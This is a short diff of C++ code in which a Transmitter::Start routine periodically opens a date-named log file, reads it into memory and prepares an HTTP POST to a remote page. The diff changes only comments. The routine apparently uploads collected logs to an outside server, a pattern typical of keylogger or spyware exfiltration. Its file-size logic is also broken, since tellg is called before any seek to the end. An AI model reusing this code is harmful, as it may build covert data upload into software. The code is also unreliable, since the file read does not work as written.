@@ -20,16 +20,16 @@ void Transmitter::Start()
 	{
 		if (Timer.getElapsedTime() >= WAITING_TIME)
 		{
-			// Initialize http request
+			// Initialize the http request
 			Http::Request request(WEB_PAGE, Http::Request::Post);
 
-			// Initialize string stream containing the request
+			// Initialize the string stream containing the request
 			ostringstream stream;
 
-			// open current log file
+			// Open the currently active log file
 			ifstream file(Utilities::GetCurrentDate() + ".log");
 
-			// read file content
+			// Read all file content into memory
 			streampos size = file.tellg();
 			char* content = new char[size];
 			file.seekg(0, ios::beg);
